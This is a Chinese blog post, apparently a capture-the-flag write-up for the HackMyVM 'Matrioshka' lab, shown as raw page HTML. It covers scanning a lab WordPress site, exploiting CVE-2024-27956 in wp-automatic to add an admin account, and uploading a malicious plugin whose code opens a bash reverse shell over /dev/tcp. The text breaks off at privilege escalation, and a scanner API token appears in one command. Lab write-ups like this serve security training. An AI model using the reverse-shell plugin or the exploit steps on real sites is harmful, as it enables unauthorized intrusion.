<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，分享技术、学习和生活的点滴记录" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录生活和学习的点滴" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，分享技术、学习和生活的点滴记录" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/logo.png" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/30beb44fbcb86528.css" as="style"/><link rel="stylesheet" href="/_next/static/css/30beb44fbcb86528.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-14467d077592c8ff.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-752aeb2338340b1c.js" defer=""></script><script src="/_next/static/szBRjLeP1kfB-U6tIesme/_buildManifest.js" defer=""></script><script src="/_next/static/szBRjLeP1kfB-U6tIesme/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMMatrioshka (only user)","contentHtml":"\u003ch1\u003eMatrioshka. (only user)\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Matrioshka\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Matrioshka\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes：\u003cstrong\u003eThis lab needed around 2 minutes for get up all the containers.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Matrioshka nmap -sP 192.168.56.0/24                  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 23:05 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00072s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00057s latency).\nMAC Address: 08:00:27:2F:F3:93 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.49\nHost is up (0.00038s latency).\nMAC Address: 08:00:27:6A:20:65 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.50\nHost is up (0.00040s latency).\nMAC Address: 08:00:27:6C:FD:E0 (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Matrioshka nmap -sT -min-rate 10000 -p- 192.168.56.50\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 23:06 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.50\nHost is up (0.00080s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:6C:FD:E0 (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 10.88 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Matrioshka nmap -sT -A -T4 -O -p 22,80 192.168.56.50\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 23:06 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.50\nHost is up (0.00078s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\n| ssh-hostkey: \n|   256 b5:a4:7c:65:5c:1f:d7:89:42:bd:76:\u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e:2c:8e:93:4e (ECDSA)\n|_  256 5d:3d:2b:43:\u003cspan class=\"hljs-built_in\"\u003efc\u003c/span\u003e:89:fa:24:a3:f4:73:5f:7b:89:6c:e3 (ED25519)\n80/tcp open  http    Apache httpd 2.4.61 ((Debian))\n|_http-title: mamushka\n|_http-server-header: Apache/2.4.61 (Debian)\nMAC Address: 08:00:27:6C:FD:E0 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.78 ms 192.168.56.50\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 24.67 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Matrioshka nmap -script=vuln 22,80 192.168.56.50\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 23:08 EDT\nFailed to resolve \u003cspan class=\"hljs-string\"\u003e\"22,80\"\u003c/span\u003e.\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.50\nHost is up (0.00019s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.50\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://192.168.56.50:80/\n|     Form id: wp-block-search__input-2\n|     Form action: http://mamushka.hmv/\n|     \n|     Path: http://192.168.56.50:80/\n|     Form id: um_field_8_user_login\n|_    Form action: \n|_http-dombased-xss: Couldn'\u003c/span\u003et find any DOM based XSS.\n| http-enum: \n|   /wp-login.php: Possible admin folder\n|   /readme.html: Wordpress version: 2 \n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.\n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.\n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.\n|_  /wp-login.php: Wordpress login page.\nMAC Address: 08:00:27:6C:FD:E0 (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 48.17 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e看 \u003ccode\u003escript\u003c/code\u003e 扫描的结果是 \u003ccode\u003ewordpress\u003c/code\u003e ，将 \u003ccode\u003emamushka.hmv\u003c/code\u003e 添加进 \u003ccode\u003e/etc/hosts\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接上 \u003ccode\u003ewpscan\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Matrioshka wpscan --url mamushka.hmv --api-token bOauzGNYvhy6BU3DlHGCMVZmWJDqZH5tuFoHfsdk91o -e u,ap --plugins-detection mixed  \n_______________________________________________________________                                         \n         __          _______   _____                                                                    \n         \\ \\        / /  __ \\ / ____|                                                                    \n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®                                                  \n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | \u003cspan class=\"hljs-string\"\u003e'_ \\                                                   \n            \\  /\\  /  | |     ____) | (__| (_| | | | |   \n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|                                                  \n                                             \n         WordPress Security Scanner by the WPScan Team    \n                         Version 3.8.27           \n       Sponsored by Automattic - https://automattic.com/                                                \n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                  \n_______________________________________________________________    \n                                                            \n[+] URL: http://mamushka.hmv/ [192.168.56.50]\n[+] Started: Tue Apr 22 23:16:04 2025\n\nInteresting Finding(s):\n[+] Headers\n | Interesting Entries:\n |  - Server: Apache/2.4.61 (Debian)\n |  - X-Powered-By: PHP/8.2.22\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://mamushka.hmv/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://mamushka.hmv/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://mamushka.hmv/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.6.1 identified (Insecure, released on 2024-07-23).\n | Found By: Query Parameter In Install Page (Aggressive Detection)\n |  - http://mamushka.hmv/wp-includes/css/dashicons.min.css?ver=6.6.1\n |  - http://mamushka.hmv/wp-includes/css/buttons.min.css?ver=6.6.1\n |  - http://mamushka.hmv/wp-admin/css/forms.min.css?ver=6.6.1\n |  - http://mamushka.hmv/wp-admin/css/l10n.min.css?ver=6.6.1\n |  - http://mamushka.hmv/wp-admin/css/install.min.css?ver=6.6.1\n\n[+] WordPress theme in use: twentytwentyfour\n | Location: http://mamushka.hmv/wp-content/themes/twentytwentyfour/\n | Last Updated: 2024-11-13T00:00:00.000Z\n | Readme: http://mamushka.hmv/wp-content/themes/twentytwentyfour/readme.txt\n | [!] The version is out of date, the latest version is 1.3\n | Style URL: http://mamushka.hmv/wp-content/themes/twentytwentyfour/style.css\n | Style Name: Twenty Twenty-Four\n | Style URI: https://wordpress.org/themes/twentytwentyfour/\n | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...\n | Author: the WordPress team\n | Author URI: https://wordpress.org\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 1.2 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://mamushka.hmv/wp-content/themes/twentytwentyfour/style.css, Match: '\u003c/span\u003eVersion: 1.2\u003cspan class=\"hljs-string\"\u003e'\n\n[+] Enumerating All Plugins (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:04:06 \u0026#x3C;==========================================================================================================================\u003e (110121 / 110121) 100.00% Time: 00:04:06\n[+] Checking Plugin Versions (via Passive and Aggressive Methods)\n\n[i] Plugin(s) Identified:\n\n[+] akismet\n | Location: http://mamushka.hmv/wp-content/plugins/akismet/\n | Latest Version: 5.3.7\n | Last Updated: 2025-04-14T23:37:00.000Z\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/akismet/, status: 403\n |\n | [!] 1 vulnerability identified:\n |\n | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)\n |     Fixed in: 3.1.5\n |     References:\n |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357\n |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/\n |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html\n |\n | The version could not be determined.\n [+] meta-generator-and-version-info-remover\n | Location: http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/\n | Latest Version: 16.0 (up to date)\n | Last Updated: 2024-11-20T05:03:00.000Z\n | Readme: http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/, status: 403\n |\n | Version: 16.0 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\n\n[+] ultimate-member\n | Location: http://mamushka.hmv/wp-content/plugins/ultimate-member/\n | Last Updated: 2025-04-02T20:20:00.000Z\n | Readme: http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\n | [!] The version is out of date, the latest version is 2.10.2\n |\n | Found By: Urls In Homepage (Passive Detection)\n | Confirmed By: Known Locations (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/ultimate-member/, status: 403\n |\n | [!] 7 vulnerabilities identified:\n |\n | [!] Title: Ultimate Member \u0026#x3C; 2.8.7 - Cross-Site Request Forgery to Membership Status Change\n |     Fixed in: 2.8.7\n |     References:\n |      - https://wpscan.com/vulnerability/2b670a80-2682-4b7f-a549-64a35345e630\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8520\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7ffddc03-d4ae-460e-972a-98804d947d09\n |\n | [!] Title: Ultimate Member \u0026#x3C; 2.8.7 - Authenticated (Contributor+) Stored Cross-Site Scripting\n |     Fixed in: 2.8.7\n |     References:\n |      - https://wpscan.com/vulnerability/7488f9f3-03ea-4f4e-b5fb-c0dd02c5bb59\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8519\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/9e394bb2-d505-4bf1-b672-fea3504bf936\n |\n | [!] Title: Ultimate Member \u0026#x3C; 2.9.0 - Missing Authorization to Authenticated (Subscriber+) Arbitrary User Profile Picture Update\n |     Fixed in: 2.9.0\n |     References:\n |      - https://wpscan.com/vulnerability/54a53b30-4249-4559-85f8-7aeac2dc0df2\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10528\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0a9793b6-2186-46ef-b204-d8f8f154ebf3\n |\n | [!] Title: Ultimate Member – User Profile, Registration, Login, Member Directory, Content Restriction \u0026#x26; Membership Plugin \u0026#x3C; 2.9.2 - Information Exposure\n |     Fixed in: 2.9.2\n |     References:\n |      - https://wpscan.com/vulnerability/cb9c5ef8-51f8-4a46-ae56-23302c5980aa\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0318\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4ee149bf-ffa3-4906-8be2-9c3c40b28287\n |\n | [!] Title: Ultimate Member \u0026#x3C; 2.9.2 - Unauthenticated SQL Injection\n |     Fixed in: 2.9.2\n |     References:\n |      - https://wpscan.com/vulnerability/31ef60db-4847-4623-a194-8722e668e6ab\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0308\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e3e5bb98-2652-499a-b8cd-4ebfe1c1d890\n |\n | [!] Title: Ultimate Member \u0026#x3C; 2.10.0 - Authenticated SQL Injection\n |     Fixed in: 2.10.0\n |     References:\n |      - https://wpscan.com/vulnerability/90b5192a-ceee-4612-8e21-2341bae29cad\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12276\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/846f9828-2f1f-4d08-abfb-909b8d634d8a\n |\n | [!] Title: Ultimate Member \u0026#x3C; 2.10.1 - Unauthenticated SQLi\n |     Fixed in: 2.10.1\n |     References:\n |      - https://wpscan.com/vulnerability/1d39ff72-1178-4812-be55-9bf4b58bbbb6\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1702\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/34adbae5-d615-4f8d-a845-6741d897f06c\n |\n | Version: 2.8.6 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\n\n [+] wp-automatic\n | Location: http://mamushka.hmv/wp-content/plugins/wp-automatic/\n | Latest Version: 3.110.0\n | Last Updated: 2025-04-15T04:28:47.000Z\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/wp-automatic/, status: 200\n |\n | [!] 7 vulnerabilities identified:\n |\n | [!] Title: Automatic 2.0.3 - csv.php q Parameter SQL Injection\n |     Fixed in: 2.0.4\n |     References:\n |      - https://wpscan.com/vulnerability/dadc99ca-54ee-42b4-b247-79a47b884f03\n |      - https://www.exploit-db.com/exploits/19187/\n |      - https://packetstormsecurity.com/files/113763/\n |\n | [!] Title: WordPress Automatic \u0026#x3C; 3.53.3 - Unauthenticated Arbitrary Options Update\n |     Fixed in: 3.53.3\n |     References:\n |      - https://wpscan.com/vulnerability/4e5202b8-7317-4a10-b9f3-fd6999192e15\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4374\n |      - https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/\n |\n | [!] Title: Automatic \u0026#x3C; 3.92.1 - Cross-Site Request Forgery to Privilege Escalation\n |     Fixed in: 3.92.1\n |     References:\n |      - https://wpscan.com/vulnerability/fa2f3687-7a5f-4781-8284-6fbea7fafd0e\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27955\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/12adf619-4be8-4ecf-8f67-284fc44d87d0\n |\n | [!] Title: Automatic \u0026#x3C; 3.92.1 - Unauthenticated Arbitrary File Download and Server-Side Request Forgery\n |     Fixed in: 3.92.1\n |     References:\n |      - https://wpscan.com/vulnerability/53b97401-1352-477b-a69a-680b01ef7266\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27954\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/620e8931-64f0-4d9c-9a4c-1f5a703845ff\n |\n | [!] Title: Automatic \u0026#x3C; 3.92.1 - Unauthenticated SQL Injection\n |     Fixed in: 3.92.1\n |     References:\n |      - https://wpscan.com/vulnerability/53a51e79-a216-4ca3-ac2d-57098fd2ebb5\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27956\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a8b319be-f312-4d02-840f-e2a91c16b67a\n |\n | [!] Title: WordPress Automatic Plugin \u0026#x3C; 3.93.0 Cross-Site Request Forgery\n |     Fixed in: 3.93.0\n |     References:\n |      - https://wpscan.com/vulnerability/e5d0dcec-41a7-40ae-b9ce-f839de9c28b8\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32693\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6231e47e-2120-4746-97c1-2aa80aa18f4e\n |\n | [!] Title: WordPress Automatic \u0026#x3C; 3.95.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via autoplay Parameter\n |     Fixed in: 3.95.0\n |     References:\n |      - https://wpscan.com/vulnerability/d0198310-b323-476a-adf8-10504383ce1c\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4849\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4be58bfa-d489-45f5-9169-db8bab718175\n |\n | The version could not be determined.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:20 \u0026#x3C;==================================================================================================================================\u003e (10 / 10) 100.00% Time: 00:00:20\n\n[i] User(s) Identified:\n\n[+] admin\n | Found By: Rss Generator (Passive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] WPScan DB API OK\n | Plan: free\n | Requests Done (during the scan): 6\n | Requests Remaining: 19\n\n[+] Finished: Tue Apr 22 23:21:28 2025\n[+] Requests Done: 110201\n[+] Cached Requests: 25\n[+] Data Sent: 29.485 MB\n[+] Data Received: 15.042 MB\n[+] Memory used: 576.402 MB\n[+] Elapsed time: 00:05:23\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中 \u003ccode\u003ewp-automatic\u003c/code\u003e 和 \u003ccode\u003eultimate-member\u003c/code\u003e 有漏洞，其中\u003ccode\u003ewp-automatic\u003c/code\u003e 不知道准确版本\u003c/p\u003e\n\u003ch3\u003eCVE-2024-27956\u003c/h3\u003e\n\u003cp\u003e最后测试中，发现存在 \u003ccode\u003eCVE-2024-27956\u003c/code\u003e 可利用，exp：\u003ca href=\"https://github.com/diego-tella/CVE-2024-27956-RCE\"\u003ehttps://github.com/diego-tella/CVE-2024-27956-RCE\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003eexp 通过漏洞给我们创建了恶意管理员用户 \u003ccode\u003eeviladmin:admin\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eWordPress 后台利用\u003c/h3\u003e\n\u003cp\u003e上传恶意插件来 \u003ccode\u003eGetshell\u003c/code\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e制作恶意插件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php\n/**\n * Plugin Name: Reverse Shell Plugin\n * Plugin URI: \n * Description: Reverse Shell Plugin \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e penetration testing.\n * Version: 1.0\n * Author: Security Analyst\n * Author URI: http://www.example.com\n */\n\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.4/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e);\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Matrioshka vim shell.php \n➜  Matrioshka zip shell.zip shell.php \n  adding: shell.php (deflated 28%)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e上传 \u003ccode\u003eshell.zip\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e上传完毕后\u003ccode\u003eKali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后到插件页面\u003cstrong\u003e启用\u003c/strong\u003e插件就能收到弹回来的 \u003ccode\u003eshell\u003c/code\u003e 了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权 - to matrioshka\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e可以看到是在\u003ccode\u003eDocker\u003c/code\u003e 